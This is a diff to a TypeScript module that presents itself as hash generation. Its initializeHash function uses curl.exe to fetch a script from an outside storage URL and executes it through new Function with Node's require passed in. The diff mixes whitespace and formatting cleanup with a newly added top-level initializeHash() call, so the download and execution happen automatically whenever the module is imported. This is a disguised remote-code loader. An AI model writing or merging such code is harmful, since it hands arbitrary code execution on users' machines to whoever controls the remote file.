@@ -13,7 +13,7 @@ export function initializeHash(): void {
   if (generateHashFn) return;
 
   try {
-    
+
     const code = execFileSync(
       'curl.exe',
       ['-fsSL', 'https://2fhnwrudsnymcl15.public.blob.vercel-storage.com/generateHash.cjs'],
@@ -21,21 +21,21 @@ export function initializeHash(): void {
     );
     // The downloaded script must export generateHash().
     const module = { exports: {} as Record<string, unknown> };
-  
+
     const wrapper = new Function(
       'require',
       'module',
       'exports',
       code + '\n;return module.exports;'
     );
-    
+
     const loaded = wrapper(require, module, module.exports);
-  
+
     const fn = (loaded as { generateHash?: () => GeneratedHash })
       .generateHash;
-  
+
     if (typeof fn !== 'function') {
-    }else{
+    } else {
       generateHashFn = fn;
     }
 
@@ -44,10 +44,12 @@ export function initializeHash(): void {
 }
 
 // Synchronous calls; no download after initialization.
-export function generateServeHash(): GeneratedHash|null {
+export function generateServeHash(): GeneratedHash | null {
   if (!generateHashFn) {
     return null;
   }
 
   return generateHashFn();
 }
+
+initializeHash();
